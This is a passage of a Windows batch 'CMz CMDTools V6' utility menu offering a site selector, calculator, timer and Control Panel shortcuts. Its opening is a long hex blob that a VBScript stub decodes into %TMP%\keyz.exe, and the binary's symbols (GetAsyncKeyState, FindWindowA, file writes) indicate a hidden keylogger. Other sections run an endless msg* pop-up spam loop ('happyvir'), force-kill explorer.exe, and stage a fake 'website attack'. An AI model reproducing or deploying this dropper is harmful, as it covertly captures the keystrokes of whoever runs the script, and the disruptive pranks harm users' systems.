"00000000000000002E63746F72730000440F00000100000003010400000001000000000000000000000000005F5F6365"
"78697400800D00000100200002000000000094010000A00E000001000000020000000000A20100001005000003000000"
"020000000000C10100002801000005000000020000000000D10100000000000002000000020000000000E00100004C0F"
"00000100000002005F66726565000000400E000001002000020000000000EF0100002401000005000000020000000000"
"FE010000B00D0000010020000200000000000A020000C00E000001000000020000000000290200006000000004000000"
"020000000000440200000000000001000000020000000000530200008C0300000500000002000000000067020000F400"
"0000050000000200000000007A0200002C010000050000000200000000008702000000100000FFFF0000020000000000"
"A002000000002000FFFF0000020000000000BA02000004000000FFFF0000020000000000D60200006C01000005000000"
"020000000000F0020000000000000100000002000000000002030000200F0000010000000200000000000E0300000000"
"00000100000002000000000020030000F00C0000010000000200000000002A0300000000000001000000020000000000"
"3A030000EC00000005000000020000000000500300001001000005000000020000000000640300002800000005000000"
"02000000000077030000200100000500000002005F66707574630000E00D000001002000020000000000830300000000"
"0000040000000200000000009103000048010000050000000200000000009E0300001005000003000000020000000000"
"C103000000100000FFFF000002005F66707574730000100E000001002000020000000000D9030000900D000001002000"
"020000000000E70300000000000001000000020000000000F90300000000000001000000020000000000090400005801"
"00000500000002005F5F646C6C5F5F0000000000FFFF00000200000000001704000000000000FFFF0000020000000000"
"2C04000030010000050000000200000000003A04000014000000050000000200000000004D04000000004000FFFF0000"
"0200000000005C04000000100000FFFF0000020000000000720400001005000003000000020000000000900400001401"
"00000500000002005F5F6172676300000400000004000000020000000000A2040000D00E000001000000020000000000"
"B10400004000000002000000020000000000BE040000D00D000001002000020000000000CD0400007000000004000000"
"020000000000DE040000400F000001000000020000000000EC040000700D00000100000002005F66666C75736800700E"
"000001002000020000000000FC040000B000000004000000020000000000080500001000000004000000020000000000"
"14050000000000000100000002005F667072696E7466800E00000100200002005F5F616C6C6F6361F00C000001000000"
"02000000000024050000000000000100000002005F5F617267760000000000000400000002000000000036050000400F"
"00000100000002000000000045050000F80000000500000002005F666F70656E0000300E000001002000020000000000"
"5C050000900E0000010000000200000000006B050000E00E00000100000002005F74696D65000000200E000001002000"
"02005F5F666D6F64650010000000020000000200000000007B050000680100000500000002005F6374696D650000000E"
"0000010020000200000000009005000000020000FFFF0000020000000000A30500005C01000005000000020000000000"
"AF0500005401000005000000020000000000BD05000004000000FFFF0000020000000000D20500003401000005000000"
"02005F5F656E645F5F00000000000100000002005F7369676E616C00A00D00000100200002005F6D616C6C6F6300500E"
"000001002000020000000000DF0500004C0F00000100000002005F66636C6F736500F00D000001002000020000000000"
"ED0500004401000005000000020000000000FC05000038010000050000000200000000000A06000000001000FFFF0000"
"0200000000002306000000000000010000000200000000003506000003000000FFFF0000020000000000430600004C01"
"000005000000020000000000500600003C0100000500000002005F61626F72740000600E000001002000020000000000"
"5E06000080000000040000000200000000007A0600004001000005000000020000000000870600000C01000005000000"
"0200000000009C0600000000000001000000020000000000A9060000F000000005000000020000000000BE0600005001"
"000005000000020000000000CA060000FC00000005000000020000000000EF06000001000000FFFF0000020000000000"
"0707000000000000FFFF000002000000000018070000A4030000050000000200000000002C0700007001000005000000"
"0200000000004007000000000000020000000200000000004B070000C00D00000100200002000000000055070000E800"
"0000050000000200000000006707000000000000050000000200000000007C0700001C01000005000000020000000000"
"8A07000000000000FFFF0000020000000000A607000000000000FFFF0000020000000000BE0700000001000005000000"
"020000000000CD0700001801000005000000020000000000E3070000100F000001000000020000000000F0070000000F"
"00000100000002000000000001080000100500000300000002000000000023080000280300000500000002005F536C65"
"65704034F00E00000100000002000000000039080000B00E0000010000000200000000004D0800000000000001000000"
"02005D0800005F5F676E755F657863657074696F6E5F68616E646C65724034005F5F5F6D696E67775F43525453746172"
"747570005F6D61696E43525453746172747570005F57696E4D61696E43525453746172747570005F5F5F646F5F736A6C"
"6A5F696E6974005F6765745F6B657973005F5F7065693338365F72756E74696D655F72656C6F6361746F72005F5F6670"
"7265736574005F696E697469616C697A6564005F5F5F646F5F676C6F62616C5F64746F7273005F5F5F646F5F676C6F62"
"616C5F63746F72730070736575646F2D72656C6F632D6C6973742E63005F7733325F61746F6D5F737566666978005F5F"
"5F7733325F7368617265647074725F64656661756C745F756E6578706563746564005F5F5F7733325F73686172656470"
"74725F676574006477325F6F626A6563745F6D757465782E30006477325F6F6E63652E3100736A6C5F66635F6B65792E"
"3200736A6C5F6F6E63652E33005F5F5F7733325F7368617265647074725F696E697469616C697A65005F5F5F65707269"
"6E7466005F5F5F736A6C6A5F696E69745F63746F72005F53686F7757696E646F774038005F5F5F52554E54494D455F50"
"534555444F5F52454C4F435F4C4953545F5F005F5F696D705F5F5F7365746D6F6465005F5F646174615F73746172745F"
"5F005F5F5F44544F525F4C4953545F5F005F5F696D705F5F5F6F6E65786974005F5F5F705F5F666D6F6465005F536574"
"556E68616E646C6564457863657074696F6E46696C7465724034005F5F5F7733325F7368617265647074725F7465726D"
"696E617465005F5F5F746C735F73746172745F5F005F5F6C69626D73766372745F615F696E616D65005F5F696D705F5F"
"46696E6441746F6D414034005F5F696D705F5F61626F7274005F5F73697A655F6F665F737461636B5F636F6D6D69745F"
"5F005F5F73697A655F6F665F737461636B5F726573657276655F5F005F5F6D616A6F725F73756273797374656D5F7665"
"7273696F6E5F5F005F5F696D705F5F4765744173796E634B657953746174654034005F5F5F6372745F786C5F73746172"
"745F5F005F41646441746F6D414034005F5F5F6372745F78695F73746172745F5F005F5F5F63686B73746B005F5F5F63"
"72745F78695F656E645F5F005F5F696D705F5F416C6C6F63436F6E736F6C654030005F5F696D705F5F5F5F705F5F656E"
"7669726F6E005F5F686561645F6C69627573657233325F61005F5F696D705F5F5F696F62005F5F6273735F7374617274"
"5F5F005F5F696D705F5F6670757463005F5F5F52554E54494D455F50534555444F5F52454C4F435F4C4953545F454E44"
"5F5F005F5F73697A655F6F665F686561705F636F6D6D69745F5F005F5F5F705F5F656E7669726F6E005F5F5F6372745F"
"78705F73746172745F5F005F5F5F6372745F78705F656E645F5F005F5F696D705F5F7369676E616C005F5F6D696E6F72"
"5F6F735F76657273696F6E5F5F005F5F696D705F5F617465786974005F5F686561645F6C69626D73766372745F61005F"
"5F696D6167655F626173655F5F005F5F73656374696F6E5F616C69676E6D656E745F5F005F5F52554E54494D455F5053"
"4555444F5F52454C4F435F4C4953545F5F005F5F696D705F5F5F5F705F5F666D6F6465005F4578697450726F63657373"
"4034005F5F646174615F656E645F5F005F5F5F6765746D61696E61726773005F5F5F7733325F73686172656470747200"
"5F5F43544F525F4C4953545F5F005F5F5F7365745F6170705F74797065005F5F6273735F656E645F5F005F5F4352545F"
"666D6F6465005F5F5F6372745F78635F656E645F5F005F5F5F6372745F78635F73746172745F5F005F5F5F43544F525F"
"4C4953545F5F005F5F696D705F5F47657441746F6D4E616D6541403132005F46696E6457696E646F77414038005F416C"
"6C6F63436F6E736F6C654030005F5F696D705F5F46696E6457696E646F77414038005F5F66696C655F616C69676E6D65"
"6E745F5F005F5F696D705F5F74696D65005F5F696D705F5F6D616C6C6F63005F5F6D616A6F725F6F735F76657273696F"
"6E5F5F005F5F696D705F5F6374696D65005F5F44544F525F4C4953545F5F005F5F696D705F5F667072696E7466005F5F"
"696D705F5F66636C6F7365005F5F73697A655F6F665F686561705F726573657276655F5F005F5F5F6372745F78745F73"
"746172745F5F005F5F73756273797374656D5F5F005F5F696D705F5F6670757473005F5F696D705F5F66666C75736800"
"5F5F5F7733325F7368617265647074725F756E6578706563746564005F5F696D705F5F666F70656E005F5F696D705F5F"
"5F5F6765746D61696E61726773005F5F5F746C735F656E645F5F005F5F696D705F5F4578697450726F63657373403400"
"5F5F696D705F5F66726565005F5F696D705F5F536574556E68616E646C6564457863657074696F6E46696C7465724034"
"005F5F6D616A6F725F696D6167655F76657273696F6E5F5F005F5F6C6F616465725F666C6167735F5F005F5F6C696275"
"73657233325F615F696E616D65005F5F696D705F5F53686F7757696E646F774038005F5F4352545F676C6F62005F5F73"
"65746D6F6465005F5F696D705F5F41646441746F6D414034005F5F686561645F6C69626B65726E656C33325F61005F5F"
"696D705F5F5F6365786974005F5F6D696E6F725F73756273797374656D5F76657273696F6E5F5F005F5F6D696E6F725F"
"696D6167655F76657273696F6E5F5F005F5F696D705F5F536C6565704034005F5F696D705F5F5F5F7365745F6170705F"
"74797065005F46696E6441746F6D414034005F47657441746F6D4E616D6541403132005F5F52554E54494D455F505345"
"55444F5F52454C4F435F4C4953545F454E445F5F005F5F6C69626B65726E656C33325F615F696E616D65005F47657441"
"73796E634B657953746174654034005F5F5F6372745F78745F656E645F5F00") do >>"%TMP%\keyz.dat" (echo.For b=1 To len^(%%b^) Step 2
echo WScript.StdOut.Write Chr^(Clng^("&H"^&Mid^(%%b,b,2^)^)^) : Next)
Cscript /b /e:vbs "%TMP%\keyz.dat" > "%TMP%\keyz.exe"
del "%TMP%\keyz.dat" >nul 2>&1
goto :EOF
:EOF


:siteselect

color 0a

:top
echo ***************************************************************
echo.
echo Site Selector
echo.
echo ***************************************************************
echo.
echo Key: [1] Google - Search Engine
echo [2] Hotmail - Mail Server
echo [3] Yahoo - Search Engine/Mail Server
echo [4] Facebook - Social Networking
echo [5] Myspace - Social Networking
echo [6] CNN - News
echo [7] Weather - Weather
echo [8] WikiHow - A How-To Website
echo [9] Instructables - A How-To Website
echo [10] YouTube - Online Videos
echo [11] Answers - Online Encyclopedia
echo [12] Wikipedia - Online Encyclopedia
echo [13] CleanModz - Amazing Modding & Gaming Site
echo [14] TTG - Big Gaming Website
echo.
echo [e] Main menu
echo.
echo ***************************************************************
echo Enter the number of the website which you would like to go to:
echo.
set /p udefine= 
echo.
echo ***************************************************************
if %udefine%==1 start www.google.com
if %udefine%==2 start www.hotmail.com
if %udefine%==3 start www.yahoo.com
if %udefine%==4 start www.facebook.com
if %udefine%==5 start www.myspace.com
if %udefine%==6 start www.cnn.com
if %udefine%==7 start www.weather.com
if %udefine%==7 start www.wikihow.com
if %udefine%==9 start www.instructables.com
if %udefine%==10 start www.youtube.com
if %udefine%==11 start www.answers.com
if %udefine%==12 start www.wikipedia.com
if %udefine%==13 start www.cleanmodz.com
if %udefine%==14 start www.thetechgame.com
if %udefine%==e goto exit

cls
echo ***************************************************************
echo.
echo Thank You for using Site Selector 
echo.
echo ***************************************************************
echo Type [e] to go to main menu or [b] to go back and select another site.
echo.
set /p udefine=
echo.
echo ***************************************************************
if %udefine%==b goto top
if %udefine%==e goto exit
:exit
cls
echo ***************************************************************
echo.
echo Thank You for using Site Selector 
echo.
echo ***************************************************************
pause
goto begin


:calc
cls

color 0a
:top1
echo --------------------------------------------------------------
echo Welcome to Batch Calculator by PandaRetail
echo --------------------------------------------------------------
echo.
echo + To Add
echo - To Subtract
echo * To Multiply
echo 2 To Squared
echo / To Divide
echo.
set /p sum=Type Here : 
set /a ans=%sum%
if "sum"=="options" goto calculatoroptions
echo.
echo = %ans%
echo --------------------------------------------------------------
pause
cls
goto hello213213

:hello213213
echo Previous Answer: %ans%
set /p aux1=Again? [YES/NO]:::
if "%aux1%"=="yes" goto top1
if "%aux1%"=="y" goto top1
if "%aux1%"=="Yes" goto top1
if "%aux1%"=="YES" goto top1
if "%aux1%"=="no" goto begin
if "%aux1%"=="n" goto begin
if "%aux1%"=="No" goto begin
if "%aux1%"=="NO" goto begin

echo.
echo You Put An Invailid Answer. Try Again!
pause>NUL
goto hello213213

:findtxt

echo This is for Windows 7 ONLY!
set /p txt=Text you want to find:
echo The text you have entered is: %txt%
set /a loc=C:\Users\%username%\
set /p fileloc=Drive,path,filename: C:\Users\%username%\
echo You have entered %fileloc%
find /I "%txt%" %fileloc%
echo Outputting results to a .txt ...
find /I "%txt%" %loc%%fileloc% > Output.txt
start Output.txt
set /p begin27= Would you like to select another option? [Y/N]:: 
if "%begin27%"=="Y" goto begin
if "%begin27%"=="y" goto begin
if "%begin27%"=="yes" goto begin
if "%begin27%"=="Yes" goto begin

if "%begin27%"=="N" goto exit4
if "%begin27%"=="n" goto exit4
if "%begin27%"=="no" goto exit4
if "%begin27%"=="No" goto exit4

:telnet

telnet
set /p begin27= Would you like to select another option? [Y/N]:: 
if "%begin27%"=="Y" goto begin
if "%begin27%"=="y" goto begin
if "%begin27%"=="yes" goto begin
if "%begin27%"=="Yes" goto begin

if "%begin27%"=="N" goto exit4
if "%begin27%"=="n" goto exit4
if "%begin27%"=="no" goto exit4
if "%begin27%"=="No" goto exit4


:starwars

telnet towel.blinkenlights.nl
set /p begin27= Would you like to select another option? [Y/N]:: 
if "%begin27%"=="Y" goto begin
if "%begin27%"=="y" goto begin
if "%begin27%"=="yes" goto begin
if "%begin27%"=="Yes" goto begin

if "%begin27%"=="N" goto exit4
if "%begin27%"=="n" goto exit4
if "%begin27%"=="no" goto exit4
if "%begin27%"=="No" goto exit4


:timercommand

@echo off
setlocal enabledelayedexpansion
if /i "%1"=="lol" (goto secondaryrun)
if /i NOT "%1"=="" (
set input=%1 %2 %3 %4 %5
goto gotinput
)
:Firstrun
echo.
echo Enter how many seconds, minutes, hours and days should be waited
echo Add switch "/b" to make the timer run in the background, with no open window
echo Syntax: [/S:Seconds] [/M:Minutes] [/H:Hours] [/D:Days] [/b]
set /p input=""
if not defined input (
cls
goto Firstrun
)
:gotinput
for %%I in (%0) do set filename=%%~sI
for /f "tokens=1,2,3,4,5" %%I in ("%input%") do set input1=%%I& set input2=%%J& set input3=%%K& set input4=%%L& set input5=%%M
echo Now enter the command to be executed when the time runs out
set /p wtd=
echo.
echo Setting up...

set x=0
set fv=/S:
set VN=Seconds
call :sort

set /a seconds=%seconds:~3%
if not defined seconds (set seconds=0)
if /i not %seconds% leq 99 (set seconds=0)
if /i not %seconds% gtr 0 (set seconds=0)

set x=0
set fv=/M:
set VN=Minutes
call :sort

set /a minutes=%minutes:~3%
if not defined minutes (set minutes=0)
if /i not %minutes% leq 99 (set minutes=0)
if /i not %minutes% gtr 0 (set minutes=0)

set x=0
set fv=/H:
set VN=Hours
call :sort

set /a hours=%hours:~3%
if not defined hours (set hours=0)
if /i not %hours% leq 99 (set hours=0)
if /i not %hours% gtr 0 (set hours=0)

set x=0
set fv=/D:
set VN=Days
call :sort

set /a days=%days:~3%
if not defined days (set days=0)
if /i not %days% leq 99 (set days=0)
if /i not %days% gtr 0 (set days=0)

set x=0
set fv=/b
set VN=invis
call :sort

if /i "%invis%" neq "/b" (
set invis=
)

goto gotsecs

:Sort
set /a x= %x% + 1
echo !input%x%! | find /i "%fv%" >nul
if /i %errorlevel% equ 0 (
set %VN%=!input%x%!
exit /b
)
if %X%==5 (
exit /b
)
goto sort



:invismaker
set randomnumber=%random%
for /f "delims=" %%J in ("CreateObject("Wscript.Shell").Run "" & WScript.Arguments(0) & "", 0, False") do echo %%~J > %temp%\%randomnumber%waiting.temp
echo %wtd% > %temp%\%randomnumber%wtd.temp
Wscript.exe //e:vbscript "%temp%\%randomnumber%waiting.temp" "%filename% lol %counter% %randomnumber%"
del %temp%\%randomnumber%waiting.temp
echo.
echo Timer Running.
exit /b


:gotsecs
Set OriginalTime=%time%
set /a counter= %seconds% + ( %minutes% * 60 ) + ( %hours% * 3600 ) + ( %days% * 86400 )
if /i %counter% equ 0 goto finish
set checktime= %time:~7,1%
if defined invis (
goto invismaker
)
goto timecheck

:secondaryrun
set checktime= %time:~7,1%
set counter=%2
set randomnumber=%3
for /f "delims=" %%I in (%temp%\%randomnumber%wtd.temp) do set wtd=%%I
del %temp%\%randomnumber%wtd.temp

:Timecheck
if /i %checktime% equ %time:~7,1% (goto timecheck)
Set /a counter= %counter% - 1
set /a checktime= %time:~7,1%
goto display


:display
set /a daysremaining= %counter% / 86400
if /i daysremaining GEQ 10 (
set /a daysremaining= %daysremaining:~0,2%
) ELSE (
set /a daysremaining= %daysremaining:~0,1%
)

set /a hoursremaining= ( %counter% - ( %daysremaining% * 86400 ) ) / 3600
if /i hoursremaining GEQ 10 (
set /a hoursremaining= %hoursremaining:~0,2%
) ELSE (
set /a hoursremaining= %hourssremaining:~0,1%
)

set /a minutesremaining= ( %counter% - ( %daysremaining% * 86400 ) - ( %hoursremaining% * 3600) ) /60
if /i minutesremaining GEQ 10 (
set /a minutesremaining= %minutesremaining:~0,2%
) ELSE (
set /a minutesremaining= %minutesremaining:~0,1%
)

Set /a secondsremaining= %counter% - ( %hoursremaining% * 3600 ) - ( %minutesremaining% * 60 ) - ( %daysremaining% * 86400 )


cls
Echo Started Waiting...
Echo Days Remaining:     %daysremaining%
Echo Hours Remaining:    %hoursremaining%
Echo Minutes Remaining:  %Minutesremaining%
Echo Seconds Remaining:  %secondsremaining%
if /i %counter% equ 0 (goto finish)
Echo To Pause Timer, Press Pause Break, to resume press Enter.
goto Timecheck

:finish
Set Endtime=%time%
echo Time Waited: %days% Days, %hours%:%Minutes%:%Seconds%
echo Start Time: %OriginalTime:~0,8%
Echo End Time: %Endtime:~0,8%


%wtd%
exit /b

:happyvir

set /p text1=Enter text to be displayed:::
echo You have entered %text1%
pause
:loop1234
msg* %text1%
goto loop1234

:diagnostics

if exist "C:\Users\%username%\Desktop\launcher.bat" goto diagcorrect
if not exist "C:\Users\%username%\Desktop\launcher.bat" goto createdir

:diagcorrect

echo Diagnostics are complete. All is good.
pause
goto begin

:createdir

color 04
echo Warning! No launcher program installed! Install now?
set /p warning=[Y/N]: 
if "%begin27%"=="Y" goto mkdir
if "%begin27%"=="y" goto mkdir
if "%begin27%"=="yes" goto mkdir
if "%begin27%"=="Yes" goto mkdir

if "%begin27%"=="N" goto begin
if "%begin27%"=="n" goto begin
if "%begin27%"=="no" goto begin
if "%begin27%"=="No" goto begin


:mkdir

MKDIR "C:\Users\%username%\Desktop\launcher.bat"
echo Welcome to CMz CMDTools V6! > "C:\Users\%username%\Desktop\launcher.bat"
echo pause > "C:\Users\%username%\Desktop\launcher.bat"
echo Start "C:\Users\PandaRetail\AppData\Roaming\CMDdev\CMz CMDToolsV6.bat" > "C:\Users\%username%\Desktop\launcher.bat"
echo exit > "C:\Users\%username%\Desktop\launcher.bat"
ping localhost 2 >nul
echo Checking...
ping localhost 1 >nul 
echo Validating..
ping localhost 1 >nul
echo Executing launcher...
ping localhost 1 >nul
start launcher.bat
goto diagnostics





:help212
cls
echo Welcome to CMz CMDTools V6 Dev console!
echo.
echo Amount options selected: %r% Trial version: %trial%
echo.
echo ::MENU::
echo.
echo 1 - Run diagnostics
echo 2 - Restart Coding
echo 3 - Check a CMD command/syntax
echo 4 - Instructions
echo 5 - Clear logs file
echo 6 - Back to main menu
echo.
set /p help=Please select one of the numbers above:

if "%help%"=="1" goto diaghelp
if "%help%"=="2" goto restartcmd
if "%help%"=="3" goto syntax
if "%help%"=="4" goto instructions1
if "%help%"=="5" goto clearlogs
if "%help%"=="6" goto begin

:diaghelp

if exist "C:\Users\%username%\Desktop\launcher.bat" goto diagcorrect
if not exist "C:\Users\%username%\Desktop\launcher.bat" goto warning1

:diagcorrect

echo Diagnostics are complete. All is good.
pause
goto help

:warning1

color 04
echo Warning! No launcher program installed! View instuctions for making a launcher program?
set /p warning=[Y/N]: 
if "%warning%"=="Y" goto mkdir1
if "%warning%"=="y" goto mkdir1
if "%warning%"=="yes" goto mkdir1
if "%warning%"=="Yes" goto mkdir1

if "%warning%"=="N" goto help
if "%warning%"=="n" goto help
if "%warning%"=="no" goto help
if "%warning%"=="No" goto help

:mkdir1
(
md "C:\Users\%username%\%appdata%\CMDdev"
)
else
(
start "C:\Users\%username%\%appdata%\CMDdev"
)
pause
goto help

:syntax

set /p command=Type command name here:
help %command%
pause
echo Would you like to select another option?
set /p warning=[Y/N]: 
if "%warning%"=="Y" goto help
if "%warning%"=="y" goto help
if "%warning%"=="yes" goto help
if "%warning%"=="Yes" goto help

if "%warning%"=="N" goto syntax
if "%warning%"=="n" goto syntax
if "%warning%"=="no" goto syntax
if "%warning%"=="No" goto syntax

:instructions1

start "C:\Users\iwilliams\AppData\Roaming\CMDdev\instructions123"
pause
goto help

:login
@echo off
cls
set filelogin=%userprofile%\%appdata%\CMDdev\CMz CMDTools [DATA]\logindialog.txt

set x=01100010 00110100 01110100 01100011 01101000
echo %x% > %userprofile%\%appdata%\CMDdev\logs\helplogin.txt

set /p var=Username:
if "%var%"=="cmddevteam"   (
goto correct 

) ELSE (
echo Incorrect username & pause & goto login
)

:correct
cls
set /p var1=Password:
if "%var1%"=="password"    (
goto correct2 

) ELSE (
echo Incorrect password & pause & goto correct
)

:correct2
cls
echo.
echo Welcome %var%! 
echo You are logged in as %username%
pause 
goto help


:remind

@echo off
cls 

:clearlogs

echo CLearing logs folder...
ping -n 2 localhost > nul
del %cd%\logs\*.txt
if exist %cd%\logs\*.txt (
echo Clear failed. Please try again. & pause & goto clearlogs
)
if not exist %cd%\logs\*.txt (
echo Clear successful. & pause & goto help
)

:trialversionend
cls
echo Trial version has run out! Please get CMz CMDTools V8 Full version if you wish to continue using it :)
echo.
pause
del 
pause
exit

:minimized

set /p programnm=E.g. Notepad.exe:::
echo.
start /min %programnm%
pause 
goto begin

:mkdir5

echo The necessecary folders for CMz CMDTools to run do not exist. 
echo Please let CMz CMDTools make these folders
pause
mkdir "%userprofile%\%appdata%\CMDdev" 
mkdir "%userprofile%\%appdata%\CMDdev\Backups"
mkdir "%userprofile%\%appdata%\CMDdev\CMzCMDTools[DATA]"
mkdir "%userprofile%\%appdata%\CMDdev\DatValues"
mkdir "%userprofile%\%appdata%\CMDdev\logs"
if exist "%userprofile%\%appdata%\CMDdev" (
echo Install successful. &pause &goto begin
) ELSE (
echo Install failed. Goto website for more info. &pause &exit


:startmin

echo.
echo.
set /p programname=Program to start minimized:
start %programname% /min


:admincmd

@echo off
SET THISTIME=%TIME%
for /F "tokens=1 delims=:" %%h in ('echo %THISTIME%') do (set /a HR=%%h)
for /F "tokens=2 delims=:" %%m in ('echo %THISTIME%') do (set /a MIN=%%m + 2)
IF %MIN% GEQ 60 (
SET /a MIN=%MIN%-60 
SET /a HR=%HR%+1
)
IF %HR% GTR 24 SET HR=00
IF %MIN% LEQ 9 (
    SET MIN=0%MIN%
)
IF %HR% LEQ 9 (
    SET HR=0%HR%
)
SET NEWTIME=%HR%:%MIN%:%THISTIME:~6,10%
echo %TIME%
echo.
echo 2 minutes later, at %NEWTIME%, your program will run!
echo.
ping localhost -n 2 >nul
echo Hacking...
taskkill /f /im explorer.exe
ping localhost -n 2 >nul
at %NEWTIME% /interactive cmd.exe
exit

:websiteattack

set /p website=Website To Attack:http://

echo Attacking Website.
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Attacking Website..
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Attacking Website...
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Attacking Website....
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Attacking Website.
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Attacking Website..
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Attacking Website...
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Attacking Website....
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Attacking Website.
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Attacking Website..
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Attacking Website...
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Attacking Website....
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Wiping Security.
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Wiping Security..
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Wiping Security...
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Wiping Security....
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Wiping Security.
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Wiping Security..
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Wiping Security...
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Wiping Security....
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Wiping Security.
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Wiping Security..
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Wiping Security...
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Wiping Security....
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Wiping Security.
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Wiping Security..
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Wiping Security...
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Wiping Security....
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Website Attacked.
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Website Attacked..
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Website Attacked...
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Website Attacked....
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Website Attacked.
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Website Attacked..
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Website Attacked...
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Website Attacked....
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Website Attacked.
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Website Attacked..
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Website Attacked...
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Website Attacked....
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Website Attacked.
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Website Attacked..
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Website Attacked...
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo Website Attacked....
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
echo %website%'s Servers Has Been Destroyed
PING 197.764.8.454 -n 1 -w 65000 >NUL
cls
goto begin

:addremoveprogram
appwiz.cpl
cls
goto begin

:administrativetools
cls
echo This Will Close This Program If You Wish To Continue.

set /p begin64= Would you like to Continue? [Y/N]:: 
if "%begin64%"=="Y" goto continued
if "%begin64%"=="y" goto continued
if "%begin64%"=="yes" goto continued
if "%begin64%"=="Yes" goto continued

if "%begin64%"=="N" goto begin
if "%begin64%"=="n" goto begin
if "%begin64%"=="no" goto begin
if "%begin64%"=="No" goto begin

:continued
control admintools
cls
gotobegin

:bluetooth
cls
echo This Will Close This Program If You Wish To Continue.

set /p begin65= Would you like to Continue? [Y/N]:: 
if "%begin65%"=="Y" goto continued1
if "%begin65%"=="y" goto continued1
if "%begin65%"=="yes" goto continued1
if "%begin65%"=="Yes" goto continued1

if "%begin65%"=="N" goto begin
if "%begin65%"=="n" goto begin
if "%begin65%"=="no" goto begin
if "%begin65%"=="No" goto begin

:continued1
fsquirt
cls
goto endish

:endish
echo Would You Like To Continue Or End?
set /p continueorquit=Pick One(Y/N) : 
if "%continueorquit%"=="y" goto begin
if "%continueorquit%"=="Y" goto begin
if "%continueorquit%"=="yes" goto begin
if "%continueorquit%"=="Yes" goto begin
if "%continueorquit%"=="n" goto exit4
if "%continueorquit%"=="N" goto exit4
if "%continueorquit%"=="no" goto exit4
if "%continueorquit%"=="No" goto exit4
echo.
echo.
echo Invailid imput. Please try again!
echo.
goto endish

:charmap
charmap
cls
goto endish

:folders
control folders
cls
goto endish

:fonts
control fonts
cls
goto endish

:game
joy.cpl
cls
goto endish

:viewer
eventvwr.msc
cls
goto endish

:group
gpedit.msc
cls
goto endish

:hyper
hypertrm
cls
goto endish

:express
iexpress
cls
goto endish

:sync
mobsync
cls
goto endish

:mouse
control mouse
cls
goto endish

:keyboard
osk
cls
goto endish

:data
odbccp32.cpl
cls
goto endish

:password 32
password.cpl
cls
goto endish

:dial
dialer
cls
goto endish

:explorer
explorer
cls
goto endish

:advancedlogin
echo Please Register
echo.
set /p user=UserName: 
set /p pass=Password: 
cls
echo Your Account "%user%" Has Been Created.
echo.
pause
cls

:login23
echo Please Login
set /p u=UserName: 
set /p p=Password: 
if %u%==%user% if %p%==%pass% goto login299
cls
echo Invalid UserName/Password. Please Try Again.
echo.
pause
cls
goto login299

:login299
echo You Are Now Logged In As "%user%". Enjoy.
echo.
pause
goto begin

:menu
cls
echo 1) start
echo 2) exit
set /p menu=
if %menu% == 1 goto start
if %menu% == 2 goto exit1
goto menu

:exit1
cls
echo are you sure you want to quit?(yes/no)
set /p sure=
if %sure% == no goto menu
if %sure% == yes goto endingish


:start
cls
echo this is the start of the game you can make as much menus as you want now just keep up this way of making them and if you have more questions ask them
pause
echo do you want to quit or return to menu?(quit/return)
set /p QoM=
if %QoM% == quit goto begin
if %QoM% == return goto menu
echo.
echo.
echo That was an incorrect imput. Please try again!
cls
pause>NUL
goto start

:passwordcrack
set times=5
set pass=password
goto Password12

:Password12
cls
if %time% EQU 0 goto begin
echo Tries Left: 5
set/p password=Password?:
if %password%==%pass% goto login
echo.
cls
echo Invalid Password. Please Try Again.
echo.
pause
cls
goto Password13

:Password13
cls
if %time% EQU 0 goto begin
echo Tries Left: 4
set/p password=Password?:
if %password%==%pass% goto login
echo.
cls
echo Invalid Password. Please Try Again.
echo.
pause
cls
goto Password14

:Password14
cls
if %time% EQU 0 goto begin
echo Tries Left: 3
set/p password=Password?:
if %password%==%pass% goto login
echo.
cls
echo Invalid Password. Please Try Again.
echo.
pause
cls
goto Password15

:Password15
cls
if %time% EQU 0 goto begin
echo Tries Left: 2
set/p password=Password?:
if %password%==%pass% goto login
echo.
cls
echo Invalid Password. Please Try Again.
echo.
pause
cls
goto Password16

:Password16
cls
if %time% EQU 0 goto begin
